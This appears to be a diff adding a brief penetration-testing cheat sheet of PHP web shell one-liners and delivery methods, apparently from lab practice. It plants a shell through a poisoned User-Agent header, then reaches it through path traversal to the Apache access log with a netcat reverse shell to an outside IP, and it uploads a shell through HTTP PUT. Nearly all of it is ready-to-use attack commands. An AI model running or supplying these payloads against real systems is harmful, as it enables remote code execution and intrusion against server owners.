@@ -1,0 +1,21 @@
+<?php echo shell_exec($_GET['cmd']); ?>
+
+<?php system($_GET['cmd']); ?>
+
+WITH CURL:
+
+curl 192.168.187.72 -A "<?php system(\$_GET['cmd']);?>"
+
+curl -s "http://192.168.187.72:8593/index.php?book=../../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.49.187%20443%20-e%20/bin/bash%20&"
+
+WITH PUT:
+
+curl -v -X OPTIONS http://<ip address>
+
+LOOK IN ALLOW AND SEE IF PUT IS IN THERE
+
+curl -v -X PUT -d '<?php system($_GET['cmd']);?>' http://<ip address>/shell
+
+THIS WILL PUT THE PHP CMD SCRIPT INTO /shell WHICH DID NOT EXIST BEFORE WE STARTED
+
+
